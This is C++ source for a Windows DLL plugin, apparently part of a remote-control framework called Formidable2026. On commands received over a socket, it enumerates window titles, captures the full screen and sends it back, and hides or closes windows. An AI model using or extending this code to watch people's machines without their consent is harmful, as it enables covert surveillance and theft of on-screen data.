/**
 * Formidable2026 - WindowManager Module (DLL)
 * Encoding: UTF-8 BOM
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <sstream>
#include <vector>
#include <iomanip>
#include "../../Common/Config.h"
#include "../../Common/Module.h"
#include "../../Common/Utils.h"

using namespace Formidable;

void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = sizeof(CommandPkg) - 1 + len;
    header.totalLen = sizeof(PkgHeader) + header.originLen;
    
    std::vector<char> buffer(header.totalLen);
    memcpy(buffer.data(), &header, sizeof(PkgHeader));
    
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = len;
    if (len > 0 && data) {
        memcpy(pkg->data, data, len);
    }
    
    const char* pData = buffer.data();
    int remaining = (int)buffer.size();
    while (remaining > 0) {
        int sent = send(s, pData, remaining, 0);
        if (sent == SOCKET_ERROR) break;
        pData += sent;
        remaining -= sent;
    }
}

struct WindowInfo {
    HWND hwnd;
    std::string title;
    std::string className;
    bool isVisible;
};
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    std::vector<WindowInfo>* windows = (std::vector<WindowInfo>*)lParam;
    
    wchar_t title[256];
    wchar_t className[256];
    GetWindowTextW(hwnd, title, sizeof(title)/sizeof(wchar_t));
    GetClassNameW(hwnd, className, sizeof(className)/sizeof(wchar_t));
    
    if (wcslen(title) > 0 && IsWindowVisible(hwnd)) {
        WindowInfo info;
        info.hwnd = hwnd;
        info.title = WideToUTF8(title);
        info.className = WideToUTF8(className);
        info.isVisible = IsWindowVisible(hwnd);
        windows->push_back(info);
    }
    
    return TRUE;
}
std::string ListWindows() {
    std::vector<WindowInfo> windows;
    EnumWindows(EnumWindowsProc, (LPARAM)&windows);
    
    std::stringstream ss;
    for (const auto& w : windows) {
        ss << (uint64_t)w.hwnd << "|" << w.className << "|" << w.title << "\n";
    }
    
    return ss.str();
}

// 屏幕截图功能
void CaptureScreen(SOCKET s) {
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, w, h, hScreenDC, x, y, SRCCOPY);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER bfh;
    BITMAPINFOHEADER bih;

    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = bmp.bmWidth;
    bih.biHeight = bmp.bmHeight;
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;
    bih.biSizeImage = 0;
    bih.biXPelsPerMeter = 0;
    bih.biYPelsPerMeter = 0;
    bih.biClrUsed = 0;
    bih.biClrImportant = 0;

    DWORD dwBmpSize = ((bmp.bmWidth * bih.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char* lpbitmap = (char*)GlobalLock(hDIB);

    GetDIBits(hScreenDC, hBitmap, 0, (UINT)bmp.bmHeight, lpbitmap, (BITMAPINFO*)&bih, DIB_RGB_COLORS);

    bfh.bfType = 0x4D42;
    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bfh.bfReserved1 = 0;
    bfh.bfReserved2 = 0;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // 发送数据
    std::vector<char> data;
    data.insert(data.end(), (char*)&bfh, (char*)&bfh + sizeof(bfh));
    data.insert(data.end(), (char*)&bih, (char*)&bih + sizeof(bih));
    data.insert(data.end(), lpbitmap, lpbitmap + dwBmpSize);

    SendResponse(s, CMD_SCREEN_CAPTURE, data.data(), (int)data.size());

    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}

// 窗口控制功能
void ControlWindow(HWND hwnd, uint32_t action) {
    switch (action) {
    case 1: // Close
        PostMessageA(hwnd, WM_CLOSE, 0, 0);
        break;
    case 2: // Maximize
        ShowWindow(hwnd, SW_MAXIMIZE);
        break;
    case 3: // Minimize
        ShowWindow(hwnd, SW_MINIMIZE);
        break;
    case 4: // Restore
        ShowWindow(hwnd, SW_RESTORE);
        break;
    case 5: // Hide
        ShowWindow(hwnd, SW_HIDE);
        break;
    case 6: // Show
        ShowWindow(hwnd, SW_SHOW);
        break;
    }
}

// DLL 导出函数
extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
    if (pkg->cmd == CMD_WINDOW_LIST) {
        std::string result = ListWindows();
        SendResponse(s, CMD_WINDOW_LIST, result.c_str(), (int)result.size());
    } else if (pkg->cmd == CMD_SCREEN_CAPTURE) {
        CaptureScreen(s);
    } else if (pkg->cmd == CMD_WINDOW_CTRL) {
        HWND hwnd = (HWND)(uintptr_t)pkg->arg1;
        uint32_t action = pkg->arg2;
        ControlWindow(hwnd, action);
        std::string msg = "Window control command executed.";
        SendResponse(s, CMD_WINDOW_CTRL, msg.c_str(), (int)msg.size());
    }
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
